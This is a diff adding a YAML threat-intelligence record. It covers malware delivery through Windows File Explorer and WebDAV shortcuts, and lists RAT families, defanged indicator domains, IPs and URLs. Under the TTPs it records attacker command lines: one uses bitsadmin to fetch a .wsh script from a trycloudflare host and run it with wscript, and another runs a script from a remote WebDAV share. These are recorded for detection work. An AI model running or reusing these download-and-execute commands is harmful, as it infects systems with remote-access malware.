@@ -1,0 +1,56 @@
+description: Threat actors abuse Windows File Explorer to access WebDAV servers and
+  download malware using URL and LNK shortcuts.
+malware_families:
+- XWorm RAT
+- Async RAT
+- DcRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - wscript.exe
+  commandline:
+  - C:\\Windows\\System32\\cmd.exe /c bitsadmin /transfer job hxxps[://]frontier-shops-timothy-cal[.]trycloudflare[.]com/rec.wsh %TEMP%\\rec.wsh &wscript%TEMP%\\rec.wsh
+  powershell: []
+  scripting_engine:
+  - VBS
+  - JScript
+  - Python
+  - Bash scripts
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - file[://]everything-teach-pearl-eat[.]trycloudflare[.]com/DE
+  - \\exampledomain[.]com@SSL\DavWWWRoot\My_Files
+  - C:\\Windows\\System32\\wscript.exe "\\earl-dont-princess-bit.trycloudflare.com@SSL\DavWWWRoot\dat.wsh"
+  file_activity:
+  - '%TEMP%\\rec.wsh'
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 18.1.64.9
+  - 104.16.231.132
+  domains:
+  - exampledomain[.]com
+  - everything-teach-pearl-eat[.]trycloudflare[.]com
+  - frontier-shops-timothy-cal[.]trycloudflare[.]com
+  - module-brush-sort-factory[.]trycloudflare[.]com
+  - earl-dont-princess-bit.trycloudflare.com@SSL
+  - tiny-fixtures-glossary-advantage[.]trycloudflare[.]com
+  - nasdaq-aged-sf-cheers[.]trycloudflare[.]com
+  - lose-croatia-acdbentity-lt[.]trycloudflare[.]com
+  - discounted-pressed-lc-vcr[.]trycloudflare[.]com
+  - skills-statute-alberta-demand[.]trycloudflare[.]com
+  - whats-menu-familiar-zshops[.]trycloudflare[.]com
+  - publicity-jenny-paintball-gilbert[.]trycloudflare[.]com
+  urls:
+  - hxxps[://]exampledomain[.]com/My_Files/
+  - file[://]everything-teach-pearl-eat[.]trycloudflare[.]com/DE
+  - file[://]frontier-shops-timothy-cal[.]trycloudflare[.]com/documents/
+authors:
+- Kahng An, Intelligence Team
+reference: https://cofense.com/blog/abusing-windows-file-explorer-and-webdav-for-malware-delivery
+date_of_publication: February 28, 2026
+file_creation_date: February 28, 2026
